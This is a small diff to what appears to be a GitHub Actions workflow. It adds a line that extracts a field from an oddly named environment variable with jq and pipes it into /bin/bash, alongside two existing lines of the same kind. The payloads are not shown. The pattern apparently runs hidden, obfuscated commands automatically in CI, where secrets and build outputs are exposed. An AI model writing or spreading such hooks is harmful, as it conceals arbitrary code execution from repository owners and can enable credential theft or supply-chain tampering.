@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$thvdv3" | jq -r .akyyi67 | /bin/bash
           echo $mdy2 | jq -r .av25895 | /bin/bash
+          echo $lenl58 | jq -r .pl4 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
